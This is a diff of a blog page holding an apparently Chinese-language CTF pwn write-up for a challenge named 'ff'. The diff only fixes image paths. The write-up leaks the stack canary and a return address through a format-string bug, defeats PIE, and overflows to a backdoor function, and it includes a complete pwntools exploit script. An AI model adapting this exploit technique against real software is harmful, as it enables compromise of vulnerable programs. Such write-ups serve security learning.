@@ -406,17 +406,17 @@
             <div id="articleContent">
                 <h1 id="ff"><a href="#ff" class="headerlink" title="ff"></a>ff</h1><p>开了pie和canary的一道题，还有格式化字符串漏洞，用格式化字符串找到canary，然后利用当前程序的地址算出基址破解pie</p>
 <p>先计算字符串的偏移，一般canary的后两位是00，算出canary的偏移在17,下一个程序在后两个，第19</p>
-<p><img src="/2024/02/21/2024.2/test%5Cff.1.png"></p>
+<p><img src="/2024/02/21/2024.2/ff.1.png"></p>
 <p>因为要计算基址，先找到第19位程序的后四位地址再计算</p>
-<p><img src="/2024/02/21/2024.2/test%5Cff.2.png"></p>
+<p><img src="/2024/02/21/2024.2/ff.2.png"></p>
 <p>然后找到后门函数位置</p>
-<p><img src="/2024/02/21/2024.2/test%5Cff.3.png"></p>
+<p><img src="/2024/02/21/2024.2/ff.3.png"></p>
 <p>找到canary的偏移</p>
-<p><img src="/2024/02/21/2024.2/test%5Cff.4.png"></p>
+<p><img src="/2024/02/21/2024.2/ff.4.png"></p>
 <p>exp:</p>
 <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(os="linux", arch="amd64", log_level="debug")</span><br><span class="line"></span><br><span class="line">p = process("./ff")</span><br><span class="line"></span><br><span class="line">p.sendline(b"%17$p-%19$p")</span><br><span class="line"></span><br><span class="line">p.recvuntil("0x")</span><br><span class="line"></span><br><span class="line">canary = int(p.recv(16),16)</span><br><span class="line"></span><br><span class="line">ret = int(p.recv(15)[3:],16)</span><br><span class="line"></span><br><span class="line">base = ret - 0x146F</span><br><span class="line"></span><br><span class="line">cat = base + 0x1231</span><br><span class="line"></span><br><span class="line">payload = b'a' * 56 + p64(canary) + p64(0) + p64(cat)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
 
-<p><img src="/2024/02/21/2024.2/test%5Cff.5.png"></p>
+<p><img src="/2024/02/21/2024.2/ff.5.png"></p>
 <p>(因为没自己写flag所以cat不到)</p>
 
                 
